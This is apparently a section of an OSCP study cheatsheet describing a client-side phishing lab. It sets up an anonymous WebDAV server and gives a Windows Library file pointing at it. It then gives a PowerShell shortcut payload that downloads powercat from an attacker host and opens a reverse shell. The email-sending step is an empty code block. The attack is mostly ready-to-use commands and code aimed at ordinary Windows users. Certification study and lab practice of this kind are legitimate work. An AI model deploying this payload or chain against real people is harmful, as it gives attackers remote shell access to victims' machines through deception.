# 07 - Client Side Attack

Index
- [Phishing Lab](#Phishing-Lab)
    - [Authenticated attack to mailserver](#Authenticated-attack-to-mailserver)

## Phishing Lab
### Authenticated attack to mailserver
Scenario:
 - WebDav resource with malicious shortcut file
 - Reverse Shell command for Windows
 - Valid user for send email

Create WebDav resource:
``` bash
mkdir ./webdav
/home/user/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav
```

Create a Windows Library File and put in webdav DocumentRoot:
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<LibraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://$WEBDAV_SERVER</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
```

Create a shortcut file (from Windows desktop), with a reverse shell command:
``` powershell
# reverse shell example, powercat based
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8888/powercat.ps1');powercat -c $KALI -p 1337 -e powershell"
```

![shortcut](https://github.com/roccosicilia/OSCP_cheatsheet/blob/main/assets/link-file-reverse-shell.png?raw=true "shortcut")

Send email via mail server:
``` bash

```